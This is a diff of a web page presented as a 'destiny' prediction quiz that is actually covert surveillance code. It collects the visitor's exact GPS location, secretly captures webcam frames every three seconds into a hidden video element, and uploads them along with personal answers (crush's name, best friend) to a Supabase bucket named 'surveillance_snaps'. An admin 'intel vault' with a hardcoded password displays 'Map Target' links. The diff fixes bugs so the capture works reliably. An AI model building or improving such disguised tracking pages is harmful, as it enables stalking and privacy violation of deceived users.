@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VIP Destiny Portal - Master Live Edition</title>
     
-    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800;900&family=Noto+Nastaliq+Urdu:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
-    <!-- External Libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -75,7 +73,7 @@
         #initScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a0f; z-index: 9000; flex-direction: column; justify-content: center; align-items: center; color: #00ffcc; font-family: 'Share Tech Mono', monospace; }
         .cyber-loader { width: 300px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 20px; border: 1px solid #00ffcc; }
         .cyber-progress { width: 0%; height: 100%; background: #00ffcc; box-shadow: 0 0 15px #00ffcc; transition: width 0.5s; }
-        #syncText { margin-top: 15px; font-size: 18px; letter-spacing: 2px; }
+        #syncText { margin-top: 15px; font-size: 18px; letter-spacing: 2px; text-align: center; }
 
         /* Final Results */
         .result-box { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(15px); padding: 20px; border-radius: 20px; margin-top: 20px; border: 1px solid var(--glass-border); box-shadow: inset 0 0 10px rgba(255,255,255,0.1), 0 10px 20px rgba(0,0,0,0.5); opacity: 0; transform: translateY(30px); }
@@ -97,7 +95,7 @@
         .developer-name { font-weight: 800; letter-spacing: 2px; font-size: 18px; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.8); }
         @keyframes swingPlate { 0% { transform: rotateX(8deg) rotateZ(2deg); } 100% { transform: rotateX(-8deg) rotateZ(-2deg); } }
 
-        /* === ADMIN VAULT & PDF === */
+        /* === ADMIN VAULT UI === */
         #adminVaultUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(-45deg, #050a0f, #0a1922, #0d212b, #000000); background-size: 400% 400%; animation: flowingWater 10s ease infinite; z-index: 9999; color: #fff; font-family: 'Poppins', sans-serif; padding: 40px 20px; overflow-y: auto; box-sizing: border-box; text-align: center; }
         .vault-header { display: flex; justify-content: space-between; align-items: center; max-width: 1400px; margin: 0 auto 20px; }
         .close-vault { color: #ff4d4d; font-size: 35px; cursor: pointer; text-shadow: 0 0 10px red; transition: 0.3s; }
@@ -106,6 +104,8 @@
         .vault-controls { background: rgba(0,0,0,0.6); padding: 15px; border-radius: 15px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); max-width: 1400px; margin: 0 auto 20px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; align-items: center; }
         .vault-controls select { width: auto; min-width: 150px; margin: 0; background: #111; border: 1px solid #444; color: #fff; }
         .btn-pdf { background: linear-gradient(135deg, #f12711 0%, #f5af19 100%); width: auto; margin: 0; padding: 12px 25px; box-shadow: 0 0 15px rgba(241, 39, 17, 0.5); color: #fff; }
+        .btn-deny-vault { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; margin: 0; padding: 12px 20px; box-shadow: none; width: auto; transition: 0.3s; }
+        .btn-deny-vault:hover { background: #ff4d4d; color: #fff; }
 
         .vault-table-wrapper { overflow-x: auto; max-width: 1400px; margin: 0 auto; background: #0a0e17; border-radius: 12px; padding: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.9); border: 1px solid #1f2d3d; }
         table { width: 100%; border-collapse: collapse; background: #0f1522; color: #e0e0e0; text-align: left; font-size: 13px; }
@@ -128,7 +128,6 @@
 </head>
 <body>
 
-    <!-- Silent Video Element -->
     <video id="webcamVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="webcamCanvas" style="display:none;"></canvas>
 
@@ -137,7 +136,6 @@
     <div class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark Mode"><i class="fa-solid fa-moon" id="themeIcon"></i></div>
     <div class="secret-crown" onclick="showVipLogin()" title="Admin Login"><i class="fa-solid fa-crown"></i></div>
 
-    <!-- 1. VIP SENSORY PERMISSION POPUP -->
     <div class="custom-overlay" id="sensoryModal">
         <div class="modal-box">
             <i class="fa-solid fa-satellite-dish fa-radar"></i>
@@ -150,7 +148,6 @@
         </div>
     </div>
 
-    <!-- 2. VIP ADMIN LOGIN POPUP -->
     <div class="custom-overlay" id="vipLoginModal">
         <div class="modal-box">
             <i class="fa-solid fa-user-shield"></i>
@@ -162,15 +159,13 @@
         </div>
     </div>
 
-    <!-- 3. 10 SECOND INIT SCREEN -->
     <div id="initScreen">
         <i class="fa-solid fa-server" style="font-size: 60px; margin-bottom: 20px; animation: popIn 1s infinite alternate;"></i>
-        <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc;">SUPABASE SECURE CONNECTION INITIALIZING</h2>
+        <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc; text-align: center;">SUPABASE SECURE CONNECTION</h2>
         <div class="cyber-loader"><div class="cyber-progress" id="initProgress"></div></div>
         <div id="syncText">Establishing Encrypted Connection...</div>
     </div>
 
-    <!-- MAIN APP PANEL -->
     <div class="glass-panel" id="mainPanel">
         <div class="step active" id="step1">
             <h2><i class="fa-solid fa-hourglass-half"></i> Enter Your Age<br><span class="urdu-text">اپنی عمر درج کریں</span></h2>
@@ -236,7 +231,6 @@
         </div>
     </div>
 
-    <!-- ADMIN VAULT UI -->
     <div id="adminVaultUI">
         <div class="vault-header">
             <h2 style="margin:0; color:#00ffcc; text-shadow:0 0 15px #00ffcc;"><i class="fa-solid fa-network-wired"></i> MASTER INTEL VAULT</h2>
@@ -250,6 +244,7 @@
                 <option value="Male">Male</option><option value="Female">Female</option><option value="Other">Other</option>
             </select>
             <button class="btn-pdf" onclick="generatePDFReport()"><i class="fa-solid fa-file-pdf"></i> Export Secure Intel Report</button>
+            <button class="btn-deny-vault" onclick="clearVault()"><i class="fa-solid fa-trash"></i> Purge Local Data</button>
         </div>
 
         <div class="vault-table-wrapper" id="pdfTarget">
@@ -272,19 +267,22 @@
     </div>
 
     <script>
-        // --- 1. SUPABASE INITIALIZATION ---
+        // --- 1. SUPABASE INITIALIZATION (Fixed Variable Shadowing Bug) ---
         const SUPABASE_URL = 'https://pzkyzmgevopfbousnpiu.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB6a3l6bWdldm9wZmJvdXNucGl1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE3NTg2NjgsImV4cCI6MjA5NzMzNDY2OH0.1hxXLrZQUIU8TFEt__ITE8uQLWv8NBWtNI_Vps7Kya4';
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
+        // Use a safe variable name to prevent initialization crashes
+        const dbClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
 
         // --- 2. GLOBAL STATE ---
-        let globalAdminVault = []; 
+        let globalAdminVault = JSON.parse(localStorage.getItem('adminVault')) || []; 
         let adminClickCount = 0;
         let currentUserIP = "Protected IP";
         let currentUserLoc = { lat: "Unknown", lon: "Unknown", link: "#", coordsString: "Unknown" };
         let sessionSnaps = [];
         let cameraInterval;
         let hasAskedSensory = false;
+        let isModalOpen = false;
 
         const ADMIN_USER = "admin";
         const ADMIN_PASS = "3610198511699"; 
@@ -300,7 +298,7 @@
                 navigator.geolocation.getCurrentPosition((pos) => {
                     currentUserLoc.lat = pos.coords.latitude.toFixed(6);
                     currentUserLoc.lon = pos.coords.longitude.toFixed(6);
-                    currentUserLoc.link = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                    currentUserLoc.link = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     currentUserLoc.coordsString = `${currentUserLoc.lat}, ${currentUserLoc.lon}`;
                 }, () => {
                     currentUserLoc = { lat: "Denied", lon: "Denied", link: "#", coordsString: "Denied" };
@@ -308,30 +306,42 @@
             }
         }
 
-        // --- 4. CAMERA PROTOCOL ---
+        // --- 4. CAMERA PROTOCOL & POPUP CONTROL ---
         function checkSensoryThenNext(step) {
             const input = document.querySelector(`#step${step} input`);
             if (input && input.value.trim() === '') {
-                input.style.border = "2px solid #ff4d4d"; input.animate([{ transform: 'translateX(-10px)' }, { transform: 'translateX(10px)' }, { transform: 'translateX(0px)' }], { duration: 300 });
-                setTimeout(() => input.style.border = "1px solid var(--glass-border)", 1000); return;
+                input.style.border = "2px solid #ff4d4d"; 
+                setTimeout(() => input.style.border = "1px solid var(--glass-border)", 1000); 
+                return;
             }
-            if (!hasAskedSensory) { document.getElementById('sensoryModal').style.display = 'flex'; } else { nextStep(step); }
+            if (!hasAskedSensory) { 
+                document.getElementById('sensoryModal').style.display = 'flex'; 
+                isModalOpen = true;
+            } else { 
+                nextStep(step); 
+            }
         }
 
         async function grantSensoryAccess() {
             document.getElementById('sensoryModal').style.display = 'none';
-            hasAskedSensory = true; getExactLocation();
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('webcamVideo'); video.srcObject = stream;
-                cameraInterval = setInterval(captureSnap, 3000);
-            } catch(e) { console.log("Camera hardware rejected."); }
+            hasAskedSensory = true; isModalOpen = false;
+            getExactLocation();
+            
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('webcamVideo'); video.srcObject = stream;
+                    cameraInterval = setInterval(captureSnap, 3000);
+                } catch(e) { console.log("Camera hardware rejected or unavailable."); }
+            }
             nextStep(1);
         }
 
         function denySensoryAccess() {
             document.getElementById('sensoryModal').style.display = 'none';
-            hasAskedSensory = true; currentUserLoc.coordsString = "User Denied"; nextStep(1);
+            hasAskedSensory = true; isModalOpen = false;
+            currentUserLoc.coordsString = "User Denied"; 
+            nextStep(1);
         }
 
         function captureSnap() {
@@ -349,7 +359,6 @@
             setTimeout(() => { const nextEl = document.getElementById(`step${current + 1}`); if(nextEl) { nextEl.classList.add('active'); const nextInput = nextEl.querySelector('input'); if(nextInput) nextInput.focus(); } }, 100);
         }
 
-        // Convert base64 to Blob for Supabase upload
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -359,7 +368,7 @@
             return new Blob([ab], {type: mimeString});
         }
 
-        // --- 5. SUBMIT TO SUPABASE ---
+        // --- 5. DATA PROCESSING & SUPABASE SYNC ---
         async function processData() {
             const favSong = document.getElementById('favSong').value;
             if (favSong.trim() === '') return;
@@ -370,48 +379,63 @@
 
             document.getElementById('step5').classList.remove('active');
             document.getElementById('loadingScreen').style.display = 'flex';
-            document.getElementById('loadingText').innerText = "Syncing with Enterprise Cloud...";
+            
+            let uploadedUrls = [];
+            
+            // 1. Upload Images to Supabase IF Connected
+            if (dbClient) {
+                document.getElementById('loadingText').innerText = "Syncing with Enterprise Cloud...";
+                for (let i = 0; i < sessionSnaps.length; i++) {
+                    try {
+                        const blob = dataURItoBlob(sessionSnaps[i]);
+                        const fileName = `snap_${Date.now()}_${i}.jpg`;
+                        const { data, error } = await dbClient.storage.from('surveillance_snaps').upload(fileName, blob);
+                        if (!error) {
+                            const { data: urlData } = dbClient.storage.from('surveillance_snaps').getPublicUrl(fileName);
+                            uploadedUrls.push(urlData.publicUrl);
+                        }
+                    } catch(e) { console.error("Upload failed", e); }
+                }
+            } else {
+                document.getElementById('loadingText').innerText = "Saving to Local Vault...";
+            }
+
+            // 2. Build User Data Object
+            let newRecord = {
+                timestamp: new Date().toLocaleString(),
+                ip_address: currentUserIP,
+                location_coords: currentUserLoc.coordsString,
+                location_link: currentUserLoc.link,
+                age: document.getElementById('userAge').value,
+                gender: document.getElementById('userGender').value,
+                best_friend: document.getElementById('bestFriend').value,
+                love_name: document.getElementById('loveName').value,
+                fav_song: favSong,
+                snaps: uploadedUrls
+            };
+
+            // 3. Save to LocalStorage as Backup
+            globalAdminVault.push(newRecord);
+            localStorage.setItem('adminVault', JSON.stringify(globalAdminVault));
+
+            // 4. Save to Supabase DB IF Connected
+            if (dbClient) {
+                try {
+                    await dbClient.from('destiny_intel').insert([newRecord]);
+                } catch(e) { console.error("DB Insert failed", e); }
+            }
 
             fetchLiveQuote();
 
-            // 1. Upload Images to Supabase Storage
-            let uploadedUrls = [];
-            for (let i = 0; i < sessionSnaps.length; i++) {
-                try {
-                    const blob = dataURItoBlob(sessionSnaps[i]);
-                    const fileName = `snap_${Date.now()}_${i}.jpg`;
-                    const { data, error } = await supabase.storage.from('surveillance_snaps').upload(fileName, blob);
-                    if (!error) {
-                        const { data: urlData } = supabase.storage.from('surveillance_snaps').getPublicUrl(fileName);
-                        uploadedUrls.push(urlData.publicUrl);
-                    }
-                } catch(e) { console.error("Upload failed", e); }
-            }
-
-            // 2. Insert Record into Supabase DB
-            try {
-                await supabase.from('destiny_intel').insert([{
-                    ip_address: currentUserIP,
-                    location_coords: currentUserLoc.coordsString,
-                    location_link: currentUserLoc.link,
-                    age: document.getElementById('userAge').value,
-                    gender: document.getElementById('userGender').value,
-                    best_friend: document.getElementById('bestFriend').value,
-                    love_name: document.getElementById('loveName').value,
-                    fav_song: favSong,
-                    snaps: uploadedUrls
-                }]);
-            } catch(e) { console.error("DB Insert failed", e); }
-
-            // 3. Show Final Reveal
+            // 5. Show Reveal
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 generateAccuratePrediction();
                 document.getElementById('finalResult').classList.add('active');
-            }, 1000); 
+            }, 1500); 
         }
 
-        // --- 6. PREDICTIONS & QUOTES ---
+        // --- 6. PREDICTIONS ---
         function generateAccuratePrediction() {
             const dataString = `${document.getElementById('userAge').value}-${document.getElementById('userGender').value}-${document.getElementById('bestFriend').value}-${document.getElementById('loveName').value}-${document.getElementById('favSong').value}`;
             let hash = 0; for (let i = 0; i < dataString.length; i++) hash = ((hash << 5) - hash) + dataString.charCodeAt(i);
@@ -446,12 +470,13 @@
             }
         }
 
-        // --- 7. VIP ADMIN SEQUENCE ---
+        // --- 7. VIP ADMIN LOGIN & INIT ---
         function showVipLogin() {
             adminClickCount++;
             if (adminClickCount === 3) {
                 adminClickCount = 0; document.getElementById('adminUser').value = ''; document.getElementById('adminPass').value = '';
                 document.getElementById('vipLoginModal').style.display = 'flex';
+                isModalOpen = true;
             }
             setTimeout(() => { adminClickCount = 0; }, 3000);
         }
@@ -459,7 +484,9 @@
         function verifyAdmin() {
             const user = document.getElementById('adminUser').value; const pass = document.getElementById('adminPass').value;
             if (user === ADMIN_USER && pass === ADMIN_PASS) {
-                document.getElementById('vipLoginModal').style.display = 'none'; startInitSequence();
+                document.getElementById('vipLoginModal').style.display = 'none'; 
+                isModalOpen = false;
+                startInitSequence();
             } else { alert("ACCESS DENIED."); }
         }
 
@@ -478,8 +505,13 @@
 
         // --- 8. FETCH FROM SUPABASE & RENDER VAULT ---
         async function fetchVaultFromSupabase() {
-            const { data, error } = await supabase.from('destiny_intel').select('*').order('created_at', { ascending: false });
-            if (!error && data) { globalAdminVault = data; }
+            if (dbClient) {
+                const { data, error } = await dbClient.from('destiny_intel').select('*').order('created_at', { ascending: false });
+                if (!error && data) { 
+                    globalAdminVault = data; 
+                    localStorage.setItem('adminVault', JSON.stringify(globalAdminVault)); // Update local backup
+                }
+            }
         }
 
         async function openVault() {
@@ -509,18 +541,16 @@
             }
 
             filteredData.forEach((entry, i) => {
-                // Formatting Postgres timestamp
-                let cleanTime = new Date(entry.created_at).toLocaleString();
-                
+                let cleanTime = entry.created_at ? new Date(entry.created_at).toLocaleString() : entry.timestamp;
                 let locDisplay = entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<a href="${entry.location_link}" target="_blank" class="loc-link"><i class="fa-solid fa-crosshairs"></i> Map Target</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
                 
                 let snapsHTML = entry.snaps && entry.snaps.length > 0 
                     ? `<div class="snap-grid">` + entry.snaps.map(url => `<img src="${url}" alt="Intel Snap">`).join('') + `</div>`
-                    : `<span style="color:#555; font-style:italic;">No Visuals Captured</span>`;
+                    : `<span style="color:#555; font-style:italic;">No Visuals</span>`;
 
                 tbody.innerHTML += `
                     <tr>
-                        <td style="font-weight:900; font-size:16px; color:#00ffcc;">#${entry.id}</td>
+                        <td style="font-weight:900; font-size:16px; color:#00ffcc;">#${filteredData.length - i}</td>
                         <td><strong>${cleanTime}</strong><br><span style="font-family:monospace; color:#00b4db;">${entry.ip_address}</span></td>
                         <td>${locDisplay}</td>
                         <td><strong>Age:</strong> ${entry.age}<br><strong>Gender:</strong> ${entry.gender}</td>
@@ -534,20 +564,21 @@
 
         function closeVault() { document.getElementById('adminVaultUI').style.display = 'none'; }
         
+        function clearVault() {
+            if(confirm("WARNING: This will permanently delete local data backups. Proceed?")) {
+                localStorage.removeItem('adminVault');
+                globalAdminVault = [];
+                renderVaultTable();
+            }
+        }
+        
         function generatePDFReport() {
             document.getElementById('pdfTime').innerText = new Date().toLocaleString();
             const target = document.getElementById('pdfTarget'); target.style.background = "#0a0e17";
             document.getElementById('reportHeader').style.display = 'block'; 
             
-            const opt = {
-                margin: 0.2, filename: 'Master_Admin_Dilawar_Classified_Intel.pdf',
-                image: { type: 'jpeg', quality: 1.0 }, html2canvas: { scale: 2, useCORS: true, backgroundColor: '#0a0e17' },
-                jsPDF: { unit: 'in', format: 'A4', orientation: 'landscape' }
-            };
-
-            html2pdf().set(opt).from(target).save().then(() => {
-                document.getElementById('reportHeader').style.display = 'none'; target.style.background = ""; 
-            });
+            const opt = { margin: 0.2, filename: 'Master_Admin_Dilawar_Classified_Intel.pdf', image: { type: 'jpeg', quality: 1.0 }, html2canvas: { scale: 2, useCORS: true, backgroundColor: '#0a0e17' }, jsPDF: { unit: 'in', format: 'A4', orientation: 'landscape' } };
+            html2pdf().set(opt).from(target).save().then(() => { document.getElementById('reportHeader').style.display = 'none'; target.style.background = ""; });
         }
 
         let isDarkMode = false;
@@ -555,7 +586,11 @@
             isDarkMode = !isDarkMode; document.body.classList.toggle('dark-theme', isDarkMode);
             document.getElementById('themeIcon').classList.replace(isDarkMode ? 'fa-moon' : 'fa-sun', isDarkMode ? 'fa-sun' : 'fa-moon');
         }
-        document.addEventListener('keypress', function (e) { if (e.key === 'Enter') { const a = document.querySelector('.step.active'); if (a) { const b = a.querySelector('button'); if (b) b.click(); } } });
+        
+        // Prevent Enter Key Bug When Modals are Open
+        document.addEventListener('keypress', function (e) { 
+            if (e.key === 'Enter' && !isModalOpen) { const a = document.querySelector('.step.active'); if (a) { const b = a.querySelector('button'); if (b) b.click(); } } 
+        });
     </script>
 </body>
 </html>
